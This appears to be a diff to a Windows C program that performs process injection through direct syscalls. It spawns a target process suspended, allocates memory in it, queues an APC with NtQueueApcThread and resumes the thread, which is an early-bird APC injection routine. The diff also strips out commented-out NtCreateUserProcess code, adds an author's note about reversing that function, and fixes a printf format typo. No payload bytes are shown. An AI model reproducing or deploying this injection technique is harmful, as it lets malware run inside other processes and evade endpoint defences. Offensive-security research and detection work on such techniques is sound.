@@ -2,7 +2,6 @@
 #include <TlHelp32.h>
 #include <stdio.h>
 #include "syscalls.h"
-#include "ntdll.h"
 
 
 /* 
@@ -44,7 +43,7 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
-	//HANDLE hProc, hThread;
+	// HANDLE hProc;
 	OBJECT_ATTRIBUTES objectAtrributes = { sizeof(objectAtrributes) };
 	const char* procname = argv[1];
 	//const char* procname = "notepad.exe";
@@ -75,31 +74,14 @@ int main(int argc, char* argv[]) {
 	}
 	printf("%s %s spawned in suspended state.", ok, procname);
 
-	// NtCreateUserProcess()
-	//UNICODE_STRING NtImagePath;
-	//RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\calc.exe");
+	// NtCreateProcessEx()
+	// NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, &objectAtrributes, GetCurrentProcess(), CREATE_SUSPENDED, )
 
-	//PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
-	//RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
+	/* 
+		New update, im in the process of reversing NtCreateUserProcess(). This is a far more complex function than I thought. 
+		Maybe ill write a blog post about it in the future
+	*/
 
-	//PS_CREATE_INFO CreateInfo = { 0 };
-	//CreateInfo.Size = sizeof(CreateInfo);
-	//CreateInfo.State = PsCreateInitialState;
-
-	//PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-	//AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
-	//AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
-	//AttributeList->Attributes[0].Size = NtImagePath.Length;
-	//AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
-
-	//status = NtCreateUserProcess(&hProc, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
-	//if (status != 0) {
-	//	printf("%s NtCreateUserProcess() %s Failed to create process %s %x", err, ar, ar, status);
-	//	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
-	//	RtlDestroyProcessParameters(ProcessParameters);
-	//	return EXIT_FAILURE;
-	//}
-	//printf("%s Process created...", ok);
 
 	// Allocate
 	status = NtAllocateVirtualMemory(pi.hProcess, &pBaseAddress, 0, &joker_len, MEM_COMMIT, PAGE_READWRITE);
@@ -156,7 +138,7 @@ int main(int argc, char* argv[]) {
 	printf("%s NtQueueApcThread() %s Queued APC thread...", ok, ar);
 
 	// Resume Thread
-	printf("%s NtresumeThread() $s Resuming thread...", ok, ar);
+	printf("%s NtResumeThread() %s Resuming thread...", ok, ar);
 	/*ResumeThread(pi.hThread);*/
 	status = NtResumeThread(pi.hThread, &previousSuspend);
 	if (status != 0) {
